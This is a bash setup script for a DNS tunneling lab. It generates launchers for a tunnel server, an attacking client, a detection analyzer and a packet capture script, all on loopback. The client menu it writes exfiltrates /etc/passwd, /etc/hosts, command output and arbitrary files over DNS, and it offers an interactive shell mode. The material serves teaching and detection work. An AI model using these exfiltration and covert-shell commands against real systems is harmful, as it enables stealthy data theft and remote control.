#!/usr/bin/env bash
# =============================================================================
# DNS Tunneling Lab – Automated Setup Script
# =============================================================================
# Configures a two-VM or loopback lab environment for the DNS tunnel demo.
#
# Run on BOTH VMs (server VM first):
#   sudo ./lab_setup.sh [server|client|single]
#
# Modes:
#   server  – sets up the authoritative DNS server role
#   client  – sets up the attacking client role
#   single  – configure both on one machine using loopback (default)
# =============================================================================

set -euo pipefail

MODE="${1:-single}"
DOMAIN="tunnel.lab.local"
SERVER_PORT=5353
SERVER_IP="127.0.0.1"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
VENV_DIR="${SCRIPT_DIR}/.venv"
LOG_DIR="${SCRIPT_DIR}/logs"
PCAP_DIR="${SCRIPT_DIR}/captures"
EXFIL_DIR="${SCRIPT_DIR}/exfiltrated_data"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; NC='\033[0m'

banner() {
    echo -e "${CYAN}"
    cat << 'EOF'
 ____  _   _ ____    _____                       _
|  _ \| \ | / ___|  |_   _|   _ _ __  _ __   ___| |
| | | |  \| \___ \    | || | | | '_ \| '_ \ / _ \ |
| |_| | |\  |___) |   | || |_| | | | | | | |  __/ |
|____/|_| \_|____/    |_| \__,_|_| |_|_| |_|\___|_|

         L A B   D E M O N S T R A T I O N
EOF
    echo -e "${NC}"
}

info()    { echo -e "${GREEN}[+]${NC} $*"; }
warn()    { echo -e "${YELLOW}[!]${NC} $*"; }
error()   { echo -e "${RED}[-]${NC} $*"; }
step()    { echo -e "\n${BLUE}[>]${NC} $*"; }

# =============================================================================
check_root() {
    if [[ $EUID -ne 0 ]]; then
        warn "Not running as root. Port 53 will be unavailable."
        warn "Using port ${SERVER_PORT} instead."
    fi
}

# =============================================================================
install_deps() {
    step "Checking Python dependencies…"

    if ! command -v python3 &>/dev/null; then
        error "Python 3 is required. Install it and re-run."; exit 1
    fi

    PY_VER=$(python3 -c "import sys; print(f'{sys.version_info.major}.{sys.version_info.minor}')")
    info "Python ${PY_VER} found"

    # Create virtual environment
    if [[ ! -d "${VENV_DIR}" ]]; then
        info "Creating virtual environment at ${VENV_DIR}"
        python3 -m venv "${VENV_DIR}"
    fi

    # shellcheck disable=SC1090
    source "${VENV_DIR}/bin/activate"

    pip install --quiet --upgrade pip
    pip install --quiet scapy 2>/dev/null || warn "scapy install failed (live capture disabled)"
    pip install --quiet tabulate 2>/dev/null || true

    info "Dependencies installed"
}

# =============================================================================
create_dirs() {
    step "Creating lab directories…"
    mkdir -p "${LOG_DIR}" "${PCAP_DIR}" "${EXFIL_DIR}"
    info "Directories ready"
}

# =============================================================================
configure_hosts() {
    step "Configuring /etc/hosts for lab domain…"

    if grep -q "${DOMAIN}" /etc/hosts 2>/dev/null; then
        info "Lab domain already in /etc/hosts"
    else
        echo "# DNS Tunnel Lab" >> /etc/hosts
        echo "${SERVER_IP}  ${DOMAIN}" >> /etc/hosts
        info "Added ${SERVER_IP} → ${DOMAIN} to /etc/hosts"
    fi
}

# =============================================================================
write_server_launcher() {
    cat > "${SCRIPT_DIR}/start_server.sh" << EOF
#!/usr/bin/env bash
# Start the DNS Tunnel Server
SCRIPT_DIR="\$(cd "\$(dirname "\${BASH_SOURCE[0]}")" && pwd)"
source "\${SCRIPT_DIR}/.venv/bin/activate" 2>/dev/null || true

echo "[*] Starting DNS Tunnel Server on port ${SERVER_PORT}…"
echo "[*] Domain: ${DOMAIN}"
echo "[*] Exfiltrated data → \${SCRIPT_DIR}/exfiltrated_data/"
echo ""
python3 "\${SCRIPT_DIR}/dns_tunnel_server.py" \\
    --domain "${DOMAIN}" \\
    --interface 0.0.0.0 \\
    --port "${SERVER_PORT}" \\
    --verbose
EOF
    chmod +x "${SCRIPT_DIR}/start_server.sh"
}

# =============================================================================
write_client_launcher() {
    cat > "${SCRIPT_DIR}/run_demo.sh" << EOF
#!/usr/bin/env bash
# Interactive DNS Tunnel Demo Launcher
SCRIPT_DIR="\$(cd "\$(dirname "\${BASH_SOURCE[0]}")" && pwd)"
source "\${SCRIPT_DIR}/.venv/bin/activate" 2>/dev/null || true

SERVER="${SERVER_IP}"
PORT="${SERVER_PORT}"
DOMAIN="${DOMAIN}"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; NC='\033[0m'

echo -e "\${CYAN}=== DNS Tunnel Lab – Client Demo ===\${NC}"
echo ""
echo "  Server : \${SERVER}:\${PORT}"
echo "  Domain : \${DOMAIN}"
echo ""
echo -e "\${BLUE}Select demonstration mode:\${NC}"
echo "  1) Exfiltrate /etc/passwd"
echo "  2) Exfiltrate /etc/hosts"
echo "  3) Run command & exfiltrate output"
echo "  4) Custom file exfiltration"
echo "  5) Interactive shell demo"
echo "  6) Start traffic analyzer (Blue Team)"
echo "  7) Run all demos in sequence"
echo "  q) Quit"
echo ""
read -rp "Choice: " CHOICE

case "\$CHOICE" in
  1)
    echo -e "\${GREEN}[*] Exfiltrating /etc/passwd…\${NC}"
    python3 "\${SCRIPT_DIR}/dns_tunnel_client.py" \\
        --server "\$SERVER" --port "\$PORT" --domain "\$DOMAIN" \\
        --mode exfil --file /etc/passwd --verbose
    ;;
  2)
    echo -e "\${GREEN}[*] Exfiltrating /etc/hosts…\${NC}"
    python3 "\${SCRIPT_DIR}/dns_tunnel_client.py" \\
        --server "\$SERVER" --port "\$PORT" --domain "\$DOMAIN" \\
        --mode exfil --file /etc/hosts
    ;;
  3)
    read -rp "Enter command to run: " CMD
    python3 "\${SCRIPT_DIR}/dns_tunnel_client.py" \\
        --server "\$SERVER" --port "\$PORT" --domain "\$DOMAIN" \\
        --mode cmd --command "\$CMD" --verbose
    ;;
  4)
    read -rp "Enter file path: " FILEPATH
    python3 "\${SCRIPT_DIR}/dns_tunnel_client.py" \\
        --server "\$SERVER" --port "\$PORT" --domain "\$DOMAIN" \\
        --mode exfil --file "\$FILEPATH"
    ;;
  5)
    python3 "\${SCRIPT_DIR}/dns_tunnel_client.py" \\
        --server "\$SERVER" --port "\$PORT" --domain "\$DOMAIN" \\
        --mode shell
    ;;
  6)
    echo -e "\${YELLOW}[*] Starting traffic analyzer on loopback…\${NC}"
    echo "    (Run client in a separate terminal, then Ctrl+C to see summary)"
    sudo python3 "\${SCRIPT_DIR}/dns_tunnel_analyzer.py" --interface lo
    ;;
  7)
    echo -e "\${GREEN}[*] Running full demo sequence…\${NC}"
    for file in /etc/passwd /etc/hosts; do
      echo -e "\n\${BLUE}--- Exfiltrating \$file ---\${NC}"
      python3 "\${SCRIPT_DIR}/dns_tunnel_client.py" \\
          --server "\$SERVER" --port "\$PORT" --domain "\$DOMAIN" \\
          --mode exfil --file "\$file"
      sleep 1
    done
    echo -e "\n\${BLUE}--- Exfiltrating command output ---\${NC}"
    python3 "\${SCRIPT_DIR}/dns_tunnel_client.py" \\
        --server "\$SERVER" --port "\$PORT" --domain "\$DOMAIN" \\
        --mode cmd --command "uname -a && id && ip addr"
    echo -e "\n\${GREEN}[+] Demo complete. Check exfiltrated_data/ on the server.\${NC}"
    ;;
  q|Q)
    echo "Bye."; exit 0
    ;;
  *)
    echo "Invalid choice."; exit 1
    ;;
esac
EOF
    chmod +x "${SCRIPT_DIR}/run_demo.sh"
}

# =============================================================================
write_analyzer_launcher() {
    cat > "${SCRIPT_DIR}/start_analyzer.sh" << EOF
#!/usr/bin/env bash
# Start Blue Team DNS Analyzer
SCRIPT_DIR="\$(cd "\$(dirname "\${BASH_SOURCE[0]}")" && pwd)"
source "\${SCRIPT_DIR}/.venv/bin/activate" 2>/dev/null || true

IFACE="\${1:-lo}"
OUT="\${SCRIPT_DIR}/logs/alerts_\$(date +%Y%m%d_%H%M%S).json"

echo "[*] Starting DNS analyzer on interface: \$IFACE"
echo "[*] Alerts will be saved to: \$OUT"
echo "[*] Press Ctrl+C to stop and view summary"
echo ""

python3 "\${SCRIPT_DIR}/dns_tunnel_analyzer.py" \\
    --interface "\$IFACE" \\
    --output-json "\$OUT"
EOF
    chmod +x "${SCRIPT_DIR}/start_analyzer.sh"
}

# =============================================================================
write_capture_script() {
    cat > "${SCRIPT_DIR}/capture_traffic.sh" << EOF
#!/usr/bin/env bash
# Capture DNS traffic for offline analysis
PCAP="\${1:-${PCAP_DIR}/dns_tunnel_\$(date +%Y%m%d_%H%M%S).pcap}"
IFACE="\${2:-lo}"
echo "[*] Capturing DNS traffic on \$IFACE → \$PCAP"
echo "[*] Press Ctrl+C to stop"
tcpdump -i "\$IFACE" -w "\$PCAP" "udp port ${SERVER_PORT}" && echo "[+] Saved: \$PCAP"
EOF
    chmod +x "${SCRIPT_DIR}/capture_traffic.sh"
}

# =============================================================================
run_basic_test() {
    step "Running basic connectivity test…"

    source "${VENV_DIR}/bin/activate" 2>/dev/null || true

    # Spin up server briefly
    python3 "${SCRIPT_DIR}/dns_tunnel_server.py" \
        --domain "${DOMAIN}" --interface 127.0.0.1 \
        --port "${SERVER_PORT}" &
    SRV_PID=$!
    sleep 1

    # Send a quick test
    RESULT=$(python3 "${SCRIPT_DIR}/dns_tunnel_client.py" \
        --server 127.0.0.1 --port "${SERVER_PORT}" \
        --domain "${DOMAIN}" --mode cmd \
        --command "echo 'LAB_TEST_OK'" 2>&1 || true)

    kill "${SRV_PID}" 2>/dev/null || true

    if echo "${RESULT}" | grep -q "chunks sent successfully"; then
        info "Connectivity test PASSED"
    else
        warn "Connectivity test result unclear – check manually"
    fi
}

# =============================================================================
print_instructions() {
    echo ""
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║           DNS Tunnel Lab – Quick Start Guide                ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${BLUE}LAB TOPOLOGY (single machine / loopback):${NC}"
    echo "  ┌─────────────────────────────────────────┐"
    echo "  │  Terminal 1: Server (receive/decode)    │"
    echo "  │  Terminal 2: Client (encode/send)       │"
    echo "  │  Terminal 3: Analyzer (detect)          │"
    echo "  └─────────────────────────────────────────┘"
    echo ""
    echo -e "${GREEN}Step 1 – Start the tunnel server:${NC}"
    echo "  ./start_server.sh"
    echo ""
    echo -e "${GREEN}Step 2 (optional) – Start the traffic analyzer:${NC}"
    echo "  sudo ./start_analyzer.sh lo"
    echo ""
    echo -e "${GREEN}Step 3 – Run a client demonstration:${NC}"
    echo "  ./run_demo.sh"
    echo ""
    echo -e "${GREEN}Manual client examples:${NC}"
    echo "  # File exfiltration"
    echo "  python3 dns_tunnel_client.py --server 127.0.0.1 --port ${SERVER_PORT} \\"
    echo "    --domain ${DOMAIN} --mode exfil --file /etc/passwd"
    echo ""
    echo "  # Command output exfiltration"
    echo "  python3 dns_tunnel_client.py --server 127.0.0.1 --port ${SERVER_PORT} \\"
    echo "    --domain ${DOMAIN} --mode cmd --command 'id && hostname'"
    echo ""
    echo "  # Offline pcap analysis"
    echo "  python3 dns_tunnel_analyzer.py --pcap captures/capture.pcap"
    echo ""
    echo -e "${YELLOW}Files created:${NC}"
    echo "  start_server.sh      – Start the tunnel server"
    echo "  start_analyzer.sh    – Start the Blue Team analyzer"
    echo "  run_demo.sh          – Interactive demo menu"
    echo "  capture_traffic.sh   – Capture with tcpdump"
    echo "  exfiltrated_data/    – Reassembled exfil data"
    echo "  logs/                – Analyzer alert logs"
    echo "  captures/            – pcap captures"
    echo ""
    echo -e "${RED}REMINDER: This lab is for isolated environments only.${NC}"
    echo ""
}

# =============================================================================
main() {
    banner
    check_root
    install_deps
    create_dirs
    [[ "${EUID}" -eq 0 ]] && configure_hosts

    write_server_launcher
    write_client_launcher
    write_analyzer_launcher
    write_capture_script

    if [[ "${MODE}" == "single" ]]; then
        info "Single-machine mode (loopback)"
        run_basic_test || warn "Skipping auto-test"
    fi

    print_instructions
}

main
